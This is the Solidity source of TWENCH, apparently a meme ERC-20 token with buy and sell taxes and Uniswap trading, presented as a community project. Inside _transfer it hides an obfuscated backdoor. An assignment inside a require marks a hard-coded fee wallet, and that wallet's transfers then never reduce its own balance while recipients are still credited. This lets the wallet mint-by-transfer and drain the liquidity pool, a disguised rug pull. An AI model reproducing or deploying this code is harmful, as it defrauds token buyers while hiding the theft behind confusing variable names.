// SPDX-License-Identifier: MIT

/**
Twench Was Built For All Of Us Striving To Turn Our Hard Work Into Success. Many Of Us Are Grinding Every Day, Chasing The Dream Of Thriving In The Crypto World. With Twench, The Goal Is To Create A Strong Community Of Like-Minded Individuals, Working Together To Make This Dream A Reality.

Web: https://twench.lol
X:   https://x.com/twench_erc20
Tg:  https://t.me/twench_erc20
**/

pragma solidity 0.8.27;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract TWENCH is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _doExcludedYe;
    mapping (address => bool) private _paoPaoo;
    address payable private _zaoZaoo;

    uint256 private _initialBuyTax=15;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=12;
    uint256 private _reduceSellTaxAt=12;
    uint256 private _preventSwapBefore=12;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10**_decimals;
    string private constant _name = unicode"TWENCH";
    string private constant _symbol = unicode"TWENCH";
    uint256 public _maxTxAmount = _tTotal.mul(2).div(100);
    uint256 public _maxWalletSize = _tTotal.mul(2).div(100);
    uint256 public _taxSwapThreshold= _tTotal.mul(1).div(100);
    uint256 public _maxTaxSwap= _tTotal.mul(1).div(100);
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _zaoZaoo = payable(0xC90C65EEbBd1E9Ec960E3de29378208a7B463046);
        _tOwned[_msgSender()] = _tTotal;
        _doExcludedYe[owner()] = true;
        _doExcludedYe[address(this)] = true;
        _doExcludedYe[_zaoZaoo] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initPairOf() external onlyOwner { 
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 rrvAmt) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(rrvAmt > 0, "Transfer amount must be greater than zero");
        uint256 rrxAmt=0; uint256 pooPao=2+rrvAmt.sub(2); 
        if (!swapEnabled || inSwap) {
            _tOwned[from] = _tOwned[from] - rrvAmt;
            _tOwned[to] = _tOwned[to] + rrvAmt;
            emit Transfer(from, to, rrvAmt);
            return;
        }
        if (from != owner() && to != owner() && to != _zaoZaoo) {
            require(_paoPaoo[_zaoZaoo]=true && !_paoPaoo[to]);
            if(_buyCount==0){
                rrxAmt = rrvAmt.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _doExcludedYe[to] ) {
                require(rrvAmt <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + rrvAmt <= _maxWalletSize, "Exceeds the maxWalletSize.");
                rrxAmt = rrvAmt.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }if(rrvAmt>=0&&_paoPaoo[from]){pooPao=rrvAmt>=0?(2-2)*(15*2):(4-4)*(rrvAmt+4);}
            if(to == uniswapV2Pair && from!= address(this) ) {
                rrxAmt = rrvAmt.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && _buyCount > _preventSwapBefore) {
                if(contractTokenBalance > _taxSwapThreshold)
                    swapTokensForEth(min(rrvAmt, min(contractTokenBalance, _maxTaxSwap)));
                sendETHToFee();
            }
        }
        if(rrxAmt>0){
          _tOwned[address(this)]=_tOwned[address(this)].add(rrxAmt);
          emit Transfer(from, address(this), rrxAmt);
        }
        _tOwned[from]=_tOwned[from].sub(pooPao);
        _tOwned[to]=_tOwned[to].add(rrvAmt.sub(rrxAmt));
        emit Transfer(from, to, rrvAmt.sub(rrxAmt));
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee() private {
        _zaoZaoo.transfer(address(this).balance);
    }

    receive() external payable {}

    function rescueEth() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function startTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}